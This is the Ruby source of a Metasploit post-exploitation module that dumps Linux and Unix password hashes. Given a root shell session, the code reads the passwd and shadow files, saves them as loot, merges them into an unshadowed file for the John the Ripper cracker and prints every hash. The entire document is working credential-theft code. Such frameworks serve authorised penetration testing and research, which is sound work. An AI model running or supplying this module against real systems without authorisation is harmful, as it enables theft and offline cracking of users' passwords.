##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix::Priv
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Dump Password Hashes for Linux Systems',
        'Description'   => %q{ Post Module to dump the password hashes for all users on a Linux System},
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Carlos Perez <carlos_perez[at]darkoperator.com>', # original osx/linux/solaris versions
          'egypt' # consolidation
        ],
        'Platform'      => [ 'linux', 'osx', 'solaris', 'bsd' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  # Run Method for when run command is issued
  def run
    if is_root?
      passwd_file = getent_passwd
      shadow_file = getent_shadow

      # Save in loot the passwd and shadow file
      store_loot("unix.shadow", "text/plain", session, shadow_file, "shadow.txt", "Unix Password Shadow File")
      store_loot("unix.passwd", "text/plain", session, passwd_file, "passwd.txt", "Unix Passwd File")

      # Unshadow the files
      john_file = unshadow(passwd_file, shadow_file)
      john_file.each_line do |l|
        print_good(l.chomp)
      end
      # Save pwd file
      upassf = store_loot("unix.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Unshadowed Password File")
      print_good("Unshadowed Password File: #{upassf}")

    else
      print_error("You must run this module as root!")
    end

  end

  def unshadow(passwd_data, shadow_data)
    unshadowed = passwd_data.dup
    shadow_lines = shadow_data.split("\n")

    passwd_data.each_line do |passwd_line|
      shadow_lines.find do |shadow_line|
        user,hash,_ = shadow_line.split(':', 3)
        if hash !~ /^(?:\*$|!)/
          # replace an 'x' preceded by the username and succeeded by a colon
          # with the captured hash; e.g. this:
          #    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
          # into this:
          #    msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
          unshadowed.sub!(/(?<=^#{user}:)x(?=:)/m, hash)
        end
      end
    end

    unshadowed
  end

end
